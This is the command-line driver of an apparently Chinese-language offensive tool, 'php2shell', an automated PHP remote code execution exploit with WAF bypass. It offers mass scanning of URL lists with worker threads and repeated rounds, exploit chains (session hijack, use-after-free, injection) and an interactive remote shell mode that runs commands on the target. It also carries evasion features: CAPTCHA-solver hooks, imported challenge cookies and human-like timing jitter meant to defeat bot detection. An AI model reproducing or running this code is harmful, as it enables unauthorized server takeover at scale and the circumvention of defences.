def add_common_target_args(sp) -> None:
    sp.add_argument("url", nargs="?", default=None)
    sp.add_argument("-f", "--file", help="批量目标文件（每行一个 URL）")
    sp.add_argument("--timeout", type=float, default=15.0)
    sp.add_argument("--verify-tls", action="store_true")


def add_bypass_args(sp) -> None:
    sp.add_argument("--bypass-level", type=int, default=3, choices=[0, 1, 2, 3],
                    help="绕过强度 0=off 1=基础 2=+头部 3=+传输/参数（默认 3）")
    sp.add_argument("--cookie", default=None,
                    help="导入人工过挑战后的会话 Cookie（如 acw_sc__v2=...; ...）")
    sp.add_argument("--warmup", action="store_true",
                    help="预热：首击采集 WAF 追踪 Cookie 复用")
    sp.add_argument("--solver-cmd", default=None,
                    help="外部滑块/人机求解器命令（stdout 输出放行 Cookie 串）")
    sp.add_argument("--flag-cmd", default=None,
                    help="绕过成功后的自动后续操作命令（如落地 flag）")
    sp.add_argument("--flag-expect", default="hello word",
                    help="后续操作成功判据（默认 hello word）")
    sp.add_argument("--rounds", type=int, default=1, help="持续测试轮次")
    sp.add_argument("--sleep", type=float, default=5.0, help="轮次间隔秒")
    sp.add_argument("--jitter", type=float, default=2.0,
                    help="射击间拟人抖动基数秒（ML/行为对抗，触顶自动退避）")
    sp.add_argument("--try-all", action="store_true",
                    help="无视指纹，全量绕过策略逐一自动尝试（多层 WAF/未知 WAF 用）")
    sp.add_argument("--seed-mode", choices=["abort", "full"], default="abort",
                    help="投毒方式 abort=中止式(兼容 cleanup=On，默认) / full=完整发送")


def main() -> int:
    p = argparse.ArgumentParser(description="php2shell 全自动化 EXP（WAF 绕过强化版）")
    sub = p.add_subparsers(dest="mode", required=True)

    pa = sub.add_parser("auto", help="全自动流水线（零交互，持续测试）")
    add_common_target_args(pa)
    add_bypass_args(pa)
    pa.add_argument("--workers", type=int, default=8)
    pa.add_argument("-o", "--output", default="report.jsonl")
    pa.add_argument("--cmd", default=None)
    pa.add_argument("--expect", default=None)
    pa.add_argument("--force", action="store_true")
    pa.add_argument("--no-uaf", action="store_true")
    pa.add_argument("--max-attempts", type=int, default=64)
    pa.add_argument("--seed-path", default=None)
    pa.add_argument("--trigger-path", default=None)
    pa.add_argument("--seed-wordlist", default=None)
    pa.add_argument("--trigger-wordlist", default=None)
    pa.add_argument("--gadget-wordlist", default=None)
    pa.add_argument("--prop-wordlist", default=None)
    pa.add_argument("--variant", choices=PROGRESS_VALUE_VARIANTS, default=None)
    pa.add_argument("--binary", default=None)
    pa.add_argument("--zval-dtor-addr", default=None)
    pa.add_argument("--delta", choices=list(KNOWN_DELTAS), default=None)
    pa.add_argument("--offset", default=None)
    pa.add_argument("--stall", type=float, default=1.5)
    pa.add_argument("--monitor-url", default=None)

    pc = sub.add_parser("check", help="仅指纹（含 WAF 识别）")
    add_common_target_args(pc)

    pe = sub.add_parser("exploit", help="手动指定单链")
    add_common_target_args(pe)
    add_bypass_args(pe)
    pe.add_argument("--chain", choices=["hijack", "uaf", "inject"], default="hijack")
    pe.add_argument("--seed-path", default="/SEED_PATH")
    pe.add_argument("--trigger-path", default="/TRIGGER_PATH")
    pe.add_argument("--gadget", default="GADGET")
    pe.add_argument("--prop", default="PROP")
    pe.add_argument("--cmd", default="COMMAND")
    pe.add_argument("--expect", default=None)
    pe.add_argument("--sid", default=None)
    pe.add_argument("--variant", choices=PROGRESS_VALUE_VARIANTS, default="pipe_object")
    pe.add_argument("--call-addr", default=None)
    pe.add_argument("--offset", default=None)
    pe.add_argument("--stall", type=float, default=1.5)
    pe.add_argument("--monitor-url", default=None)

    # ---- shell：RCE 本体功能（单命令或命令循环）----
    psh = sub.add_parser("shell", help="RCE 命令执行（--cmd 单次 / 省略则 stdin 逐行循环）")
    add_common_target_args(psh)
    add_bypass_args(psh)
    psh.add_argument("--seed-path", default=None)
    psh.add_argument("--trigger-path", default=None)
    psh.add_argument("--gadget", default="GADGET")
    psh.add_argument("--prop", default="PROP")
    psh.add_argument("--cmd", default=None, help="单次执行命令；省略则从 stdin 逐行读取")
    psh.add_argument("--expect", default=None, help="判定串（省略则仅按回显输出）")
    psh.add_argument("--sid", default=None)
    psh.add_argument("--monitor-url", default=None)

    pb = sub.add_parser("build", help="离线生成载荷体")
    pb.add_argument("--chain", choices=["hijack", "uaf", "inject"], default="hijack")
    pb.add_argument("--cmd", default="COMMAND")
    pb.add_argument("--gadget", default="GADGET")
    pb.add_argument("--prop", default="PROP")
    pb.add_argument("--sid", default=None)
    pb.add_argument("--variant", choices=PROGRESS_VALUE_VARIANTS, default="pipe_object")
    pb.add_argument("--call-addr", default=None)
    pb.add_argument("--offset", default=None)
    pb.add_argument("-o", "--output", default="body.bin")

    args = p.parse_args()

    if args.mode == "build":
        return cmd_build(args)

    urls: List[str] = []
    if getattr(args, "url", None):
        urls.append(args.url)
    urls += load_lines(getattr(args, "file", None))
    if not urls:
        p.error("需要 URL 或 -f 目标文件")

    if args.mode == "check":
        for u in urls:
            try:
                t0 = HttpTarget(u, timeout=args.timeout, verify_tls=args.verify_tls)
                t1, hops = resolve_redirects(t0)
                r = check_one(t1)
                if hops:
                    r["redirects"] = hops
            except Exception as e:
                r = {"url": u, "status": "unreachable", "err": str(e)}
            print(json.dumps(r, ensure_ascii=False))
        return 0

    if args.mode == "exploit":
        t = HttpTarget(args.url, timeout=args.timeout, verify_tls=args.verify_tls)
        engine = BypassEngine(level=args.bypass_level, cookie=args.cookie)
        engine.seed_mode = getattr(args, "seed_mode", "abort")
        if args.chain == "hijack":
            r = chain_hijack(t, args.seed_path, args.trigger_path, args.gadget,
                             args.prop, args.cmd, sid=args.sid, expect=args.expect,
                             variant=args.variant, monitor_url=args.monitor_url,
                             engine=engine)
        elif args.chain == "uaf":
            r = chain_uaf(t,
                          args.trigger_path if args.trigger_path != "/TRIGGER_PATH" else t.base_path,
                          int(args.call_addr, 16) if args.call_addr else 0x4141414141414141,
                          int(args.offset, 16) if args.offset else 0,
                          args.cmd, sid=args.sid, stall=args.stall,
                          expect=args.expect, monitor_url=args.monitor_url, engine=engine)
        else:
            r = chain_inject(t, t.base_path, sid=args.sid, engine=engine)
        print(json.dumps(r, ensure_ascii=False, indent=2))
        return 0 if (r.get("rce_hit") or r.get("fixation")) else 3

    if args.mode == "shell":
        # RCE 本体：命令执行循环（每条命令独立投毒+触发；命中即回显输出）
        t = HttpTarget(args.url, timeout=args.timeout, verify_tls=args.verify_tls)
        engine = BypassEngine(level=args.bypass_level, cookie=args.cookie)
        engine.seed_mode = getattr(args, "seed_mode", "abort")
        sp_ = args.seed_path or t.base_path
        tp_ = args.trigger_path or t.base_path
        hits, total = 0, 0

        def one_cmd(command: str) -> None:
            nonlocal hits, total
            total += 1
            r = chain_hijack(t, sp_, tp_, args.gadget, args.prop, command,
                             expect=args.expect, sid=args.sid,
                             monitor_url=args.monitor_url, engine=engine)
            body = (r.get("body") or "")
            body = "\n".join(ln for ln in body.splitlines()
                             if "Failed to decode session object" not in ln).strip()
            if r.get("rce_hit") or body:
                hits += 1
                print(body or "(no output)")
            else:
                sys.stderr.write("[!] %s cmd=%s\n" % (r.get("error") or "no-output", command))

        if args.cmd:
            one_cmd(args.cmd)
        else:
            if sys.stdin.isatty():
                sys.stderr.write("[*] shell: 输入命令逐行执行，exit/quit 退出\n")
            for line in sys.stdin:
                c = line.strip()
                if c in ("exit", "quit"):
                    break
                if c:
                    one_cmd(c)
        sys.stderr.write("[*] shell done: %d/%d executed\n" % (hits, total))
        return 0 if hits else 3

    # ---- auto（含持续测试轮次）----
    overall: Dict[str, int] = {}
    final_code = 4
    for rnd in range(1, max(1, args.rounds) + 1):
        done_urls = set()
        if os.path.exists(args.output):
            with open(args.output, encoding="utf-8") as f:
                for ln in f:
                    try:
                        rec = json.loads(ln)
                        if rec.get("verdict") in ("rce_confirmed",):
                            done_urls.add(rec.get("target"))
                    except Exception:
                        pass
        todo = [u for u in dict.fromkeys(urls) if u not in done_urls]
        if not todo:
            break
        sys.stderr.write("[*] auto round %d/%d: %d targets workers=%d\n"
                         % (rnd, args.rounds, len(todo), args.workers))
        with open(args.output, "a", encoding="utf-8") as out:
            with cf.ThreadPoolExecutor(max_workers=max(1, args.workers)) as pool:
                futs = {pool.submit(run_target, u, args): u for u in todo}
                for fut in cf.as_completed(futs):
                    u = futs[fut]
                    try:
                        r = fut.result()
                    except Exception as e:
                        r = {"target": u, "verdict": "error", "error": str(e)}
                    r["round"] = rnd
                    overall[r["verdict"]] = overall.get(r["verdict"], 0) + 1
                    out.write(json.dumps(r, ensure_ascii=False) + "\n")
                    out.flush()
                    sys.stderr.write("[%s] %s %s\n" % (r["verdict"], r["target"], r.get("via", "")))
                    if r["verdict"] == "rce_confirmed":
                        final_code = 0
        if final_code == 0:
            break
        if rnd < args.rounds:
            time.sleep(max(0, args.sleep))

    sys.stderr.write("\n== summary ==\n")
    for k, v in sorted(overall.items()):
        sys.stderr.write("  %-28s %d\n" % (k, v))
    if overall.get("rce_confirmed"):
        return 0
    if overall.get("likely_vulnerable_no_rce") or overall.get("crash_signal") or overall.get("armed"):
        return 2
    if overall and all(k in ("unreachable", "error") for k in overall):
        return 1
    return 4


if __name__ == "__main__":
    sys.exit(main())
